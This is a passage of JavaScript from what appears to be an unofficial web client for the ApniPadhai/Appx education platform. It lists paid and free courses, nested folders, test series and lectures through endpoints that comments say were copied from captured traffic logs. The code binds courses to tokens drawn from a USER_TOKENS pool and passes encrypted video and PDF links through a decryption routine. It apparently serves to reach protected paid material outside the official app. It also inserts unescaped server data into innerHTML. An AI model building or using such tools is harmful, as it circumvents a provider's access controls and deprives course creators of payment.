                            <span class="text-[10px] font-bold text-sky-700 truncate">${c._badgeText}</span>
                        </div>
                        <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name}</h3>
                        ${c.expiryDate ? `<p class="text-[11px] font-bold text-slate-500 mt-1">⏳ Validity till: ${c.expiryDate}</p>` : ""}
                    </div>
                </div>
                <div class="px-4 pb-4">
                    <div class="btn-watch w-full text-center text-xs">Open Course Content & Tests ➔</div>
                </div>
            </div>`;
    });
}

async function renderFreeBatches() {
    if (!enforceCompulsoryLogin()) return;
    hideServerError();
    state.view = "batches";
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = "All Server Courses";
    document.getElementById("headingText").textContent = "🆓 Available Courses on Server";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Fetching Courses from ${API_BASE}...</div>`;

    const primaryTok = USER_TOKENS[0];
    const freeData = await fetchAPIWithToken(`/get/courselistnewv2?start=0`, primaryTok, true);
    const fallbackFree = (!Array.isArray(freeData) || freeData.length === 0)
        ? await fetchAPIWithToken(`/get/courselist?start=-1`, primaryTok, false)
        : freeData;

    const list = Array.isArray(fallbackFree) ? fallbackFree : [];
    grid.innerHTML = "";

    if (list.length === 0) {
        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Server par abhi koi Free Course list nahi mili.</div>`;
        return;
    }

    list.forEach(c => {
        const cid = String(c.id || c.course_id || "");
        const name = (c.course_name || "Course").replace(/'/g, "").replace(/"/g, "");
        const logo = (c.course_thumbnail || c.exam_logo || "").replace(/\\\//g, "/") || "https://placehold.co/600x320/059669/ffffff?text=Course";
        const fWise = Number(c.folder_wise_course ?? 1);
        state.courseTokenMap[cid] = primaryTok;
        grid.innerHTML += `
            <div onclick="openPaidCourse('${cid}', '${name}', ${fWise})" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <img src="${logo}" onerror="this.src='https://placehold.co/600x320/059669/ffffff?text=Course'" class="w-full h-44 object-cover">
                <div class="p-4">
                    <span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-800 text-[10px] font-black">COURSE #${cid}</span>
                    <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name || name}</h3>
                    <div class="btn-watch w-full text-center text-xs mt-3">Open Content ➔</div>
                </div>
            </div>`;
    });
}

// =====================================================
// STEP 2: OPEN COURSE & SYNC COURSE DETAILS (/get/coursenew_by_idv2)
// =====================================================
async function openPaidCourse(id, name, folderWise = 1) {
    const cid = String(id).trim();
    state.cat = "paid";
    state.courseId = cid;
    state.courseName = name;
    state.courseFolderWise = Number(folderWise ?? 1);
    state.activeTokenObj = getCourseBoundToken(cid);
    window.ACTIVE_PLAYER_TOKEN = state.activeTokenObj ? state.activeTokenObj.token : "";

    document.getElementById("subTabs").classList.remove("hidden");
    document.getElementById("crumbText").textContent = `Course #${cid}`;
    document.getElementById("headingText").textContent = name;

    // Sync course metadata from /get/coursenew_by_idv2?id=70 (Exact log match)
    fetchAPIWithToken(`/get/coursenew_by_idv2?id=${cid}`, state.activeTokenObj, true).then(cArr => {
        if (Array.isArray(cArr) && cArr.length > 0) {
            const cInfo = cArr[0];
            if (cInfo.test_series_id) {
                state.courseTestSeriesMap[cid] = String(cInfo.test_series_id);
            }
            if (cInfo.folder_wise_course !== undefined) {
                state.courseFolderWise = Number(cInfo.folder_wise_course);
            }
        }
    });

    loadCourseTab("subjects");
}

// =====================================================
// STEP 3: COURSE TABS & INFINITE NESTED FOLDERS (/get/folder_contentsv3)
// =====================================================
async function loadCourseTab(tab) {
    ["subjects", "live", "tests", "posts", "telegram"].forEach(t => {
        const el = document.getElementById("sub_" + t);
        if (el) el.className = (t === tab) ? "tab-pill active-pill" : "tab-pill";
    });

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Loading ${tab.toUpperCase()} from Server...</div>`;

    const batchTok = getCourseBoundToken(state.courseId);
    state.activeTokenObj = batchTok;
    const uid = String(batchTok?.userId || extractUidFromJwt(batchTok?.token) || "").trim();

    if (tab === "subjects") {
        state.folderStack = [];
        state.currentFolderId = "-1";
        state.currentFolderName = state.courseName;
        await openCourseFolderV3("-1", state.courseName, true);
    } else if (tab === "live") {
        state.view = "live";
        // Exact endpoint from apnipadhai.org.txt logs: /get/course_contents_by_live_status?course_id=70&start=-1&live_status=1,2
        const res = await fetchAPIWithToken(
            `/get/course_contents_by_live_status?course_id=${state.courseId}&start=-1&live_status=1,2`,
            batchTok,
            false
        );
        const list = Array.isArray(res) ? res : [...(res?.live || []), ...(res?.upcoming || [])];
        grid.innerHTML = "";
        if (list.length === 0) {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Abhi koi Live ya Upcoming class scheduled nahi hai.</div>`;
            return;
        }
        renderLectureList(list, batchTok, false);
    } else if (tab === "tests") {
        state.view = "batch_ts_subjects";
        // Exact endpoints from apnipadhai.org.txt logs:
        // 1. /get/test_seriesbycourseid?courseid=70&userid=296064&folder_wise_course=1&start=-1
        // 2. /get/quiztitlesbycourse?courseid=70&userid=296064&folder_wise_course=1
        const tsList = await fetchAPIWithToken(
            `/get/test_seriesbycourseid?courseid=${state.courseId}&userid=${uid}&folder_wise_course=1&start=-1`,
            batchTok,
            false
        );
        const quizList = await fetchAPIWithToken(
            `/get/quiztitlesbycourse?courseid=${state.courseId}&userid=${uid}&folder_wise_course=1`,
            batchTok,
            true
        );

        grid.innerHTML = "";

        if ((!Array.isArray(tsList) || tsList.length === 0) && (!Array.isArray(quizList) || quizList.length === 0)) {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is course mein abhi koi Test Series attached nahi hai.</div>`;
            return;
        }

        if (Array.isArray(tsList) && tsList.length > 0) {
            tsList.forEach(ts => {
                const tsId = String(ts.id || ts.testseries_id || "");
                const sname = (ts.title || ts.subject_name || "Batch Test Series").replace(/'/g, "").replace(/"/g, "");
                const logo = (ts.logo || "").replace(/\\\//g, "/") || "https://placehold.co/80x80/4f46e5/ffffff?text=TS";
                grid.innerHTML += `
                    <div onclick="openTestSeriesSubjects('${tsId}', '${sname}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                        <img src="${logo}" onerror="this.src='https://placehold.co/80x80/4f46e5/ffffff?text=TS'" class="w-16 h-16 rounded-2xl object-cover shadow-md shrink-0">
                        <div class="flex-1 min-w-0">
                            <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">TEST SERIES #${tsId}</span>
                            <h4 class="font-black text-base text-slate-900 mt-1 truncate">${ts.title || sname}</h4>
                            <p class="text-xs text-indigo-600 font-bold mt-1">Open Series Tests ➔</p>
                        </div>
                    </div>`;
            });
        }

        if (Array.isArray(quizList) && quizList.length > 0) {
            renderTestTitlesGrid(quizList, state.courseId, batchTok, true);
        }
    } else if (tab === "posts") {
        state.view = "posts";
        // Exact endpoint from apnipadhai.org.txt logs: /get/getposts?course_id=70&start=0
        const posts = await fetchAPIWithToken(`/get/getposts?course_id=${state.courseId}&start=0`, batchTok, false);
        grid.innerHTML = "";
        if (!Array.isArray(posts) || posts.length === 0) {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is batch mein abhi koi Announcement / Post nahi hai.</div>`;
            return;
        }
        posts.forEach(p => {
            grid.innerHTML += `
                <div class="grid-card p-5">
                    <span class="text-[10px] font-black text-sky-700 uppercase">${p.datetime || p.created_at || "Announcement"}</span>
                    <h4 class="font-black text-base text-slate-900 mt-1">${p.title || p.post_title || "Batch Update"}</h4>
                    <div class="text-xs text-slate-700 mt-2">${p.description || p.post_text || ""}</div>
                </div>`;
        });
    } else if (tab === "telegram") {
        state.view = "telegram";
        // Exact endpoint from apnipadhai.org.txt logs: /get/telegram?course_id=70&item_type=10
        const tgData = await fetchAPIWithToken(`/get/telegram?course_id=${state.courseId}&item_type=10`, batchTok, false);
        grid.innerHTML = "";
        if (Array.isArray(tgData) && tgData.length > 0) {
            tgData.forEach(tg => {
                const link = tg.telegram_link || tg.link || tg.channel_link || "#";
                grid.innerHTML += `
                    <div class="col-span-full grid-card p-6 flex flex-wrap justify-between items-center gap-4">
                        <div>
                            <span class="text-xs font-black text-blue-600 uppercase">Official Batch Channel</span>
                            <h4 class="font-black text-lg text-slate-900">✈️ ${tg.title || tg.channel_name || state.courseName}</h4>
                        </div>
                        <a href="${link}" target="_blank" class="btn-watch text-xs no-underline px-5 py-3">Join Telegram ➔</a>
                    </div>`;
            });
        } else {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is course ke liye server par koi Telegram link nahi diya gaya hai.</div>`;
        }
    }
}

// Recursive Folder Explorer matching ApniPadhai's /get/folder_contentsv3
async function openCourseFolderV3(folderId, folderName, isBackOrRoot = false) {
    state.view = "folders";
    const fId = String(folderId).trim();

    if (!isBackOrRoot && state.currentFolderId && String(state.currentFolderId) !== fId) {
        state.folderStack.push({
            id: state.currentFolderId,
            name: state.currentFolderName
        });
    }

    state.currentFolderId = fId;
    state.currentFolderName = folderName;

    document.getElementById("crumbText").textContent = state.folderStack.length > 0
        ? `${state.courseName} • Level ${state.folderStack.length}`
        : `Course #${state.courseId}`;
    document.getElementById("headingText").textContent = `📂 ${folderName}`;

    const batchTok = getCourseBoundToken(state.courseId);
    state.activeTokenObj = batchTok;

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Loading Folder Contents...</div>`;

    // Exact endpoint from apnipadhai.org.txt logs:
    // Root: /get/folder_contentsv3?course_id=70&parent_id=-1&windowsapp=false&start=0
    // Child: /get/folder_contentsv3?course_id=70&parent_id=109858&start=0
    const ep = fId === "-1"
        ? `/get/folder_contentsv3?course_id=${state.courseId}&parent_id=-1&windowsapp=false&start=0`
        : `/get/folder_contentsv3?course_id=${state.courseId}&parent_id=${fId}&start=0`;

    const rawJson = await fetchRawJSONWithToken(ep, batchTok, false);
    let items = (rawJson && Array.isArray(rawJson.data)) ? [...rawJson.data] : [];
    const totalCount = Number(rawJson?.total || items.length);

    // Auto-paginate if folder has more items than first page (e.g. 50+ lectures/folders)
    let nextStart = items.length;
    let safetyPages = 0;
    while (items.length > 0 && items.length < totalCount && safetyPages < 8) {
        safetyPages++;
        const moreEp = `/get/folder_contentsv3?course_id=${state.courseId}&parent_id=${fId}&start=${nextStart}`;
        const moreData = await fetchAPIWithToken(moreEp, batchTok, true);
        if (!Array.isArray(moreData) || moreData.length === 0) break;
        items.push(...moreData);
        nextStart += moreData.length;
    }

    // If root folder (-1) returns only 1 wrapper folder like "Home" (id: 109858 in logs), auto-enter it!
    if (fId === "-1" && items.length === 1 && String(items[0].material_type).toUpperCase() === "FOLDER") {
        const homeFolder = items[0];
        state.currentFolderId = String(homeFolder.id);
        state.currentFolderName = homeFolder.Title || "Home";
        return openCourseFolderV3(homeFolder.id, homeFolder.Title || state.courseName, true);
    }

    // Fallback to legacy subjects API if course is not folder-wise and root is empty
    if (fId === "-1" && items.length === 0) {
        const legacySubs = await fetchAPIWithToken(
            `/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`,
            batchTok,
            true
        );
        if (Array.isArray(legacySubs) && legacySubs.length > 0) {
            renderLegacySubjects(legacySubs);
            return;
        }
    }

    grid.innerHTML = "";
    if (items.length === 0) {
        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi content uplabdh nahi hai.</div>`;
        return;
    }

    const folders = items.filter(x => String(x.material_type || x.type || "").toUpperCase() === "FOLDER");
    const contents = items.filter(x => String(x.material_type || x.type || "").toUpperCase() !== "FOLDER");

    folders.forEach(f => {
        const childId = String(f.id || "").trim();
        const rawTitle = f.Title || f.title || "Folder";
        const safeTitle = rawTitle.replace(/'/g, "").replace(/"/g, "");
        const thumb = (f.thumbnail || f.image || "").replace(/\\\//g, "/") ||
                      `https://placehold.co/80x80/0284c7/ffffff?text=${encodeURIComponent(rawTitle.slice(0, 3))}`;
        const vCount = Number(f.videos_count || 0);
        const fCount = Number(f.files_count || 0);

        grid.innerHTML += `
            <div onclick="openCourseFolderV3('${childId}', '${safeTitle}', false)" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                <img src="${thumb}" onerror="this.src='https://placehold.co/80x80/0284c7/ffffff?text=DIR'" class="w-16 h-16 rounded-2xl object-cover shadow-md shrink-0">
                <div class="flex-1 min-w-0">
                    <div class="flex items-center gap-1.5 flex-wrap">
                        <span class="px-2 py-0.5 rounded bg-sky-100 text-sky-800 text-[10px] font-black">FOLDER #${childId}</span>
                        ${vCount > 0 ? `<span class="px-2 py-0.5 rounded bg-emerald-100 text-emerald-800 text-[10px] font-black">🎬 ${vCount} Videos</span>` : ""}
                        ${fCount > 0 ? `<span class="px-2 py-0.5 rounded bg-amber-100 text-amber-800 text-[10px] font-black">📄 ${fCount} PDFs</span>` : ""}
                    </div>
                    <h4 class="font-black text-base text-slate-900 mt-1 truncate">${rawTitle}</h4>
                    <p class="text-xs text-blue-600 font-extrabold mt-1">Open Folder ➔</p>
                </div>
            </div>`;
    });

    if (contents.length > 0) {
        renderLectureList(contents, batchTok, true);
    }
}

// Legacy Fallback (Only if a course uses old subject/topic endpoints)
function renderLegacySubjects(subs) {
    state.view = "subjects";
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";
    subs.forEach(s => {
        const name = s.subject_name || s.subjectname || "Subject";
        const safeName = name.replace(/'/g, "").replace(/"/g, "");
        const logo = (s.subject_logo || "").replace(/\\\//g, "/") || `https://placehold.co/80x80/0284c7/ffffff?text=SUB`;
        grid.innerHTML += `
            <div onclick="openLegacyTopics('${s.subjectid}', '${safeName}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                <img src="${logo}" onerror="this.src='https://placehold.co/80x80/0284c7/ffffff?text=SUB'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                <div class="flex-1">
                    <span class="px-2 py-0.5 rounded bg-sky-100 text-sky-800 text-[10px] font-black">SUBJECT #${s.subjectid}</span>
                    <h4 class="font-black text-base text-slate-900 mt-1">${name}</h4>
                    <p class="text-xs text-blue-600 font-extrabold mt-1">Explore Topics ➔</p>
                </div>
            </div>`;
    });
}

async function openLegacyTopics(subId, subName) {
    state.view = "topics";
    state.subjectId = subId;
    state.subjectName = subName;
    document.getElementById("headingText").textContent = `📂 ${subName}`;
    const batchTok = getCourseBoundToken(state.courseId);
    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, batchTok, false);
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";
    (Array.isArray(topics) ? topics : []).forEach(t => {
        const name = (t.topic_name || t.topicname || "Topic").replace(/'/g, "").replace(/"/g, "");
        grid.innerHTML += `
            <div onclick="openLegacyLectures('${t.topicid}', '${name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer">
                <h4 class="font-black text-base text-slate-900">📁 ${name}</h4>
                <span class="btn-watch text-xs">Classes ➔</span>
            </div>`;
    });
}

async function openLegacyLectures(topId, topName) {
    state.view = "lectures";
    state.topicId = topId;
    state.topicName = topName;
    document.getElementById("headingText").textContent = `🎬 ${topName}`;
    const batchTok = getCourseBoundToken(state.courseId);
    const classes = await fetchAPIWithToken(
        `/get/livecourseclassbycoursesubtopconceptapiv3?courseid=${state.courseId}&subjectid=${state.subjectId}&topicid=${topId}&conceptid=1&start=0`,
        batchTok,
        false
    );
    document.getElementById("mainGrid").innerHTML = "";
    renderLectureList(Array.isArray(classes) ? classes : [], batchTok, false);
}

// =====================================================
// VIDEO & PDF ITEM RENDERER (HANDLES BOTH PDF ITEMS & VIDEO LECTURES)
// =====================================================
function normalizeQualityLabel(rawLabel) {
    const s = String(rawLabel || "").toLowerCase();
    if (s.includes("1080")) return "1080p";
    if (s.includes("720")) return "720p";
    if (s.includes("480")) return "480p";
    if (s.includes("360")) return "360p";
    if (s.includes("240")) return "240p";
    if (s.includes("144")) return "144p";
    return "";
}

function extractQualitiesFromItem(item) {
    const rawMap = {};

    function addCandidate(rawQual, encPath, isM3u8Priority) {
        let u = decryptAppX(encPath);
        if (!u || !u.startsWith("http") || u.includes("playlist_eof.m3u8")) return;
        if (u.toLowerCase().endsWith(".pdf")) return;

        let cleanQ = normalizeQualityLabel(rawQual);
        if (!cleanQ) {
            const m = u.match(/\/(1080p|720p|480p|360p|240p|144p)\//i) || u.match(/bitrate=(1080|720|480|360|240)/i);
            if (m) cleanQ = m[1].toLowerCase().endsWith("p") ? m[1].toLowerCase() : `${m[1]}p`;
            else cleanQ = "720p";
        }

        if (!rawMap[cleanQ] || isM3u8Priority || u.includes(".m3u8")) {
            rawMap[cleanQ] = u;
        }
    }

    (item.encrypted_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.livestream_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.download_links || []).forEach(q => addCandidate(q.quality, q.path, false));

    if (item.video_player_url) addCandidate("720p", item.video_player_url, true);
    if (item.recording_hls) addCandidate("720p", item.recording_hls, true);

    const matType = String(item.material_type || "").toUpperCase();
    if (matType !== "PDF") {
        const decFile = decryptAppX(item.file_link || item.embed_url || "");
        if (decFile) {
            if (decFile.startsWith("http") && !decFile.includes("playlist_eof.m3u8") && !decFile.toLowerCase().endsWith(".pdf")) {
                addCandidate("720p", decFile, decFile.includes(".m3u8"));
            } else if (!decFile.startsWith("http") && decFile.length >= 10 && decFile.length <= 15) {
                rawMap["720p"] = decFile;
            }
        }
    }

    const order = ["1080p", "720p", "480p", "360p", "240p", "144p"];
    const sortedMap = {};
    order.forEach(k => {
        if (rawMap[k]) sortedMap[k] = rawMap[k];
    });
    Object.keys(rawMap).forEach(k => {
        if (!sortedMap[k]) sortedMap[k] = rawMap[k];
    });

    return sortedMap;
}

function renderLectureList(list, boundTokenObj, appendMode = false) {
    const grid = document.getElementById("mainGrid");
    if (!appendMode) {
        grid.innerHTML = "";
        state.currentLectureKeys = [];
    }

    const lectureTok = boundTokenObj || getCourseBoundToken(state.courseId);

    if (!list || !list.length) {
        if (!appendMode) {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi class ya PDF nahi hai.</div>`;
        }
        return;
    }

    list.forEach((item, i) => {
        const key = `lec_${item.id || i}`;
        const matType = String(item.material_type || item.type || "VIDEO").toUpperCase();
        const isPurePdf = matType === "PDF";

        if (!isPurePdf) {
            state.currentLectureKeys.push(key);
        }

        const qMap = extractQualitiesFromItem(item);

        // In ApniPadhai logs, PDF items have encrypted URL in pdf_link, file_link, and download_link
        const pdf1 = resolvePdfUrl(
            item.pdf_link || item.ypdf_link || (isPurePdf ? (item.file_link || item.download_link) : ""),
            item.ypdf_link2
        );
        const pdf2 = resolvePdfUrl(item.pdf_link2 || item.download_link2, item.ypdf_link2);

        const thumb = (item.thumbnail || item.image || "").replace(/\\\//g, "/");
        const title = item.Title || item.title || "Class Item";
        const dateStr = item.date_and_time || item.event_date || "";

        state.mediaMap[key] = {
            key: key,
            id: item.id,
            courseId: item.course_id || state.courseId,
            folderWise: item.folder_wise_course ?? state.courseFolderWise ?? 1,
            ytFlag: item.ytFlag || item.ytFlagWeb || 0,
            materialType: matType,
            tokenObj: lectureTok,
            title: title,
            date: dateStr,
            thumb: thumb,
            qualities: qMap,
            pdf1: pdf1,
            pdf2: pdf2
        };

        grid.innerHTML += `
            <div class="grid-card overflow-hidden flex flex-col justify-between">
                <div>
                    ${thumb ? `<img src="${thumb}" onerror="this.style.display='none'" class="w-full h-44 object-cover">` : ""}
                    <div class="p-4">
                        <span class="px-2.5 py-0.5 rounded-full ${isPurePdf ? "bg-amber-100 text-amber-900" : "bg-sky-100 text-sky-900"} text-[10px] font-black">${matType} #${item.id || (i + 1)}</span>
                        <h4 class="font-black text-base text-slate-900 mt-2">${title}</h4>
                        ${dateStr ? `<p class="text-[11px] text-slate-500 font-semibold mt-1">🕒 ${dateStr}</p>` : ""}
                    </div>
                </div>
                <div class="p-4 pt-2 border-t border-sky-100 flex flex-wrap gap-2">
                    ${!isPurePdf ? `<button onclick="playClassInRwaPlayer('${key}')" class="btn-watch flex-1 text-xs">▶ Watch Video</button>` : ""}
                    ${pdf1 ? `<button onclick="openPdf('${key}', 1)" class="btn-pdf1 ${isPurePdf ? "flex-1" : ""} text-xs">📄 ${isPurePdf ? "Open PDF Document" : "PDF 1"}</button>` : ""}
                    ${pdf2 ? `<button onclick="openPdf('${key}', 2)" class="btn-pdf2 text-xs">📄 PDF 2</button>` : ""}
                </div>
            </div>`;
    });
}

// =====================================================
// PLAYER ENGINE (SUPPORTS FOLDER_WISE_COURSE=1 VIDEO DETAILS)
// =====================================================
async function playClassInRwaPlayer(key) {
    state.activeKey = key;
    const info = state.mediaMap[key];
    if (!info) return;

    const targetCourseId = info.courseId || state.courseId;
    const batchTok = info.tokenObj || getCourseBoundToken(targetCourseId);
    state.activeTokenObj = batchTok;
    window.ACTIVE_PLAYER_TOKEN = batchTok ? batchTok.token : "";

    showSlide("slidePlayer");
    document.getElementById("playingTitle").textContent = "▶ " + info.title;

    closeInlinePdfAndReset();
    renderNextClassesBelowPlayer(key);

    const pPdf1 = document.getElementById("playerPdf1");
    const pPdf2 = document.getElementById("playerPdf2");
    if (pPdf1) {
        if (info.pdf1) pPdf1.classList.remove("hidden");
        else pPdf1.classList.add("hidden");
    }
    if (pPdf2) {
        if (info.pdf2) pPdf2.classList.remove("hidden");
        else pPdf2.classList.add("hidden");
    }

    const urlInput = document.getElementById("url");

    if (info.id) {
        const fWise = info.folderWise ?? 1;
        const endpointsToTry = [
            `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}&ytflag=${info.ytFlag || 0}&folder_wise_course=${fWise}`,
            `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}&ytflag=0&folder_wise_course=1`,
            `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0`
        ];

        for (const videoEp of endpointsToTry) {
            const fresh = await fetchAPIWithToken(videoEp, batchTok, true);
            if (fresh && typeof fresh === "object") {
                const freshMap = extractQualitiesFromItem(fresh);
                if (Object.keys(freshMap).length > 0) {
                    info.qualities = { ...info.qualities, ...freshMap };
                }
                const fPdf1 = resolvePdfUrl(fresh.pdf_link || fresh.ypdf_link, fresh.ypdf_link2);
                const fPdf2 = resolvePdfUrl(fresh.pdf_link2, fresh.ypdf_link2);
                if (fPdf1 && !info.pdf1) {
                    info.pdf1 = fPdf1;
                    if (pPdf1) pPdf1.classList.remove("hidden");
                }
                if (fPdf2 && !info.pdf2) {
                    info.pdf2 = fPdf2;
                    if (pPdf2) pPdf2.classList.remove("hidden");
                }
                if (Object.keys(info.qualities).length > 0) break;
            }
        }
    }

    const validKeys = Object.keys(info.qualities).filter(k => {
        const u = info.qualities[k];
        return u && !u.includes("playlist_eof.m3u8");
    });

    if (validKeys.length > 0 && urlInput) {
        const bestKey = validKeys.find(k => k === "720p") || validKeys[0];
        urlInput.value = info.qualities[bestKey];
        urlInput.dataset.token = batchTok?.token || "";
        urlInput.dataset.userid = batchTok?.userId || "";
        if (typeof start === "function") start();
    } else {
        showServerError("Video Link Not Found", `Class #${info.id} ke liye playable video link server se nahi mila.`, `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}`);
    }
}

function renderNextClassesBelowPlayer(activeKey) {
    const grid = document.getElementById("nextClassesGrid");
    const countBadge = document.getElementById("nextClassesCount");
    if (!grid) return;

    const allKeys = state.currentLectureKeys || [];
    const currentIndex = allKeys.indexOf(activeKey);
    const orderedNextKeys = currentIndex >= 0
        ? [...allKeys.slice(currentIndex + 1), ...allKeys.slice(0, currentIndex)]
        : allKeys.filter(k => k !== activeKey);

    if (countBadge) countBadge.textContent = `${orderedNextKeys.length} Classes`;

    if (orderedNextKeys.length === 0) {
        grid.innerHTML = `<div class="col-span-full py-6 text-center text-xs font-bold text-slate-500">Is folder mein aur koi video class nahi hai.</div>`;
        return;
    }

    grid.innerHTML = orderedNextKeys.map((k, idx) => {
        const item = state.mediaMap[k];
        if (!item) return "";
        return `
            <div class="grid-card p-3.5 flex flex-col justify-between">
                <div class="flex items-start gap-3">
                    <div class="w-10 h-10 rounded-xl bg-sky-100 text-sky-800 font-black text-xs flex items-center justify-center shrink-0">#${idx + 1}</div>
                    <div class="min-w-0 flex-1">
                        <span class="text-[10px] font-black text-sky-700 uppercase">Up Next</span>
                        <h5 class="font-extrabold text-sm text-slate-900 line-clamp-2 mt-0.5">${item.title}</h5>
                    </div>
                </div>
                <div class="flex gap-2 mt-3 pt-2 border-t border-sky-100">
                    <button onclick="playClassInRwaPlayer('${k}')" class="btn-watch flex-1 text-xs py-2">▶ Play Next</button>
                    ${item.pdf1 ? `<button onclick="openInlinePdfForKey('${k}', 1)" class="btn-pdf1 text-xs py-2">📄 PDF</button>` : ""}
                </div>
            </div>`;
    }).join("");
}

window.openActivePlayerPdf = function(num) {
    if (!state.activeKey) return;
    openInlinePdfForKey(state.activeKey, num);
};

window.openInlinePdfForKey = function(key, num) {
    const info = state.mediaMap[key];
    if (!info) return;
    const u = num === 2 ? info.pdf2 : info.pdf1;
    if (!u) return;

    state.inlinePdfUrl = u;
    document.getElementById("inlinePdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
    document.getElementById("inlineRawPdfLink").href = u;

    document.getElementById("nextClassesBox").classList.add("hidden");
    document.getElementById("inlinePdfBox").classList.remove("hidden");

    setInlinePdfMode("appx");
    document.getElementById("inlinePdfBox").scrollIntoView({ behavior: "smooth" });
};

window.setInlinePdfMode = function(mode) {
    const frame = document.getElementById("inlinePdfFrame");
    const u = state.inlinePdfUrl;
    if (!u || !frame) return;
    if (mode === "appx") {
        frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
    } else {
        frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
    }
};

window.switchBottomToNextClasses = function() {
    closeInlinePdfAndReset();
};

function closeInlinePdfAndReset() {
    const frame = document.getElementById("inlinePdfFrame");
    if (frame) frame.src = "";
    const pdfBox = document.getElementById("inlinePdfBox");
    const nextBox = document.getElementById("nextClassesBox");
    if (pdfBox) pdfBox.classList.add("hidden");
    if (nextBox) nextBox.classList.remove("hidden");
}

function changeLectureQuality(qLabel) {
    const info = state.mediaMap[state.activeKey];
    if (info && info.qualities[qLabel]) {
        const urlInput = document.getElementById("url");
        urlInput.value = info.qualities[qLabel];
        if (info.tokenObj) {
            urlInput.dataset.token = info.tokenObj.token;
            window.ACTIVE_PLAYER_TOKEN = info.tokenObj.token;
        }
        if (typeof start === "function") start();
    }
}

// =====================================================
// TEST SERIES & CBT ENGINE (NO DUMMY SERIES)
// =====================================================
async function openTestSeriesExplorer(mode) {
    if (!enforceCompulsoryLogin()) return;
    hideServerError();
    state.tsMode = mode;
    state.view = "ts_list";
    showSlide("slideExplorer");
    document.getElementById("subTabs").classList.add("hidden");

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Test Series from ${API_BASE}...</div>`;

    const primaryTok = USER_TOKENS[0];
    state.activeTokenObj = primaryTok;

    if (mode === "paid_ts") {
        document.getElementById("crumbText").textContent = "Official Exam Series";
        document.getElementById("headingText").textContent = "🏆 Paid Test Series";

        const p0 = await fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, primaryTok, false);
        const combined = Array.isArray(p0) ? p0 : [];

        grid.innerHTML = "";
        if (combined.length === 0) {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Server par koi Paid Test Series nahi mili.</div>`;
            return;
        }

        const seen = new Set();
        combined.forEach(ts => {
            if (seen.has(String(ts.id))) return;
            seen.add(String(ts.id));
            const title = (ts.title || "Test Series").replace(/'/g, "").replace(/"/g, "");
            const logo = (ts.logo || "").replace(/\\\//g, "/") || "https://placehold.co/600x320/4f46e5/ffffff?text=Test+Series";
            grid.innerHTML += `
                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                    <div>
                        <img src="${logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=Test+Series'" class="w-full h-44 object-cover">
                        <div class="p-4">
                            <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">SERIES #${ts.id}</span>
                            <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
                        </div>
                    </div>
                    <div class="px-4 pb-4">
                        <div class="btn-watch w-full text-center text-xs">Open Test Subjects ➔</div>
                    </div>
                </div>`;
        });
    } else {
        document.getElementById("crumbText").textContent = "Free Mock Tests";
        document.getElementById("headingText").textContent = "📝 Free Test Series";

        const f0 = await fetchAPIWithToken(`/get/quiz_test_series?start=0&exam_id=`, primaryTok, false);
        const combined = Array.isArray(f0) ? f0 : [];

        grid.innerHTML = "";
        if (combined.length === 0) {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Server par koi Free Test Series nahi mili.</div>`;
            return;
        }

        const seen = new Set();
        combined.forEach(ts => {
            if (seen.has(String(ts.id))) return;
            seen.add(String(ts.id));
            const title = (ts.title || "Free Test Series").replace(/'/g, "").replace(/"/g, "");
